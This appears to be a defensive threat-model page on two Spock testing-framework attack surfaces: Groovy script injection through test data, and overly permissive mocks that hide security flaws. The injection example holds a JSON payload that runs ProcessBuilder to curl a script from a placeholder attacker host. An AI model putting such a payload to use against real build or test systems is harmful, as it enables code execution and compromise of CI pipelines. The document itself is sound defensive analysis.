## Attack Surface: [Test Code Injection (Groovy Script Injection)](./attack_surfaces/test_code_injection__groovy_script_injection_.md)

*   **Description:** Execution of arbitrary Groovy code within the Spock test environment, originating from an untrusted source and leveraging Spock's Groovy integration.
    *   **How Spock Contributes:** Spock *directly* uses Groovy as its core language.  Its dynamic features, including metaprogramming and the way data providers (`where:` blocks) are handled, create the *direct* pathway for this injection.  This is not a general testing concern; it's specific to how Spock processes Groovy.
    *   **Example:**
        *   A Spock test reads test data from a JSON file. An attacker modifies the JSON to include a Groovy script snippet within a string field intended for use in a `where:` block:  `{"data": "${(new java.lang.ProcessBuilder('curl', 'http://attacker.com/evil.sh')).start()}\u0022}`. If the test uses this field directly in a Groovy expression (e.g., within a `setup:` or `expect:` block, or even implicitly within the `where:` block's condition), the malicious script executes.
    *   **Impact:** Complete compromise of the test environment, potentially leading to access to source code, test databases, build artifacts, and potentially lateral movement. Could lead to data breaches, code modification, or CI/CD pipeline disruption.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   **Strict Input Validation:** Implement rigorous input validation for *all* data used in Spock tests, *especially* data used within `where:` blocks or any Groovy expressions. Use whitelisting.
        *   **Data Sanitization:** Sanitize all data before using it in *any* Groovy context within Spock. Escape special characters meticulously.
        *   **Avoid Dynamic Code Generation:** Minimize dynamic Groovy code generation within Spock tests. If unavoidable, use parameterized approaches or secure template engines.
        *   **Least Privilege:** Run Spock tests with the absolute minimum necessary privileges.
        *   **Code Reviews:** Conduct thorough code reviews, focusing on data handling and any use of Groovy expressions within Spock tests.
        *   **Static Analysis:** Use static analysis tools specifically designed to detect Groovy code injection vulnerabilities.

## Attack Surface: [Overly Permissive Mocks Bypassing Security (Direct Spock Mocking Misuse)](./attack_surfaces/overly_permissive_mocks_bypassing_security__direct_spock_mocking_misuse_.md)

*   **Description:** Spock's mocking features are used to create mocks that bypass security checks *within the context of the Spock test itself*, leading to false positives. This is a direct misuse of Spock's mocking API.
    *   **How Spock Contributes:** Spock *provides* the mocking framework. The vulnerability lies in how developers *use* Spock's `Mock()` and interaction-based testing features. This is not a general mocking concern; it's about the incorrect application of Spock's specific mocking capabilities.
    *   **Example:**
        *   A Spock test for a method that should check user roles uses Spock's `Mock()` to create a mock of the `UserRoleService`. The interaction is defined as: `1 * userRoleService.hasRole(_, 'ADMIN') >> true`. This mock *always* returns `true`, regardless of the actual user or role, bypassing the intended security check. The test passes, but the production code might be vulnerable.
    *   **Impact:** Vulnerabilities in the production code related to security checks are masked by the Spock tests. The application may be deployed with critical security flaws that were not detected during testing.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Realistic Mocking:** Configure Spock mocks to accurately reflect the behavior of the real components, *including* security checks and error conditions.  Don't simply return `true` for all security-related interactions.
        *   **Negative Testing:** Include Spock tests that specifically test security boundaries and expected failures.  Verify that unauthorized access is *denied* by the mocked components.
        *   **Interaction-Based Testing with Constraints:** Use Spock's interaction-based testing features with precise constraints.  Instead of `_` (any argument), specify expected arguments to ensure the mock is called correctly. For example: `1 * userRoleService.hasRole(userWithNoAdminRole, 'ADMIN') >> false`.
        *   **Code Reviews:** Carefully review Spock mock configurations to ensure they are not overly permissive and that they accurately represent the expected security behavior.
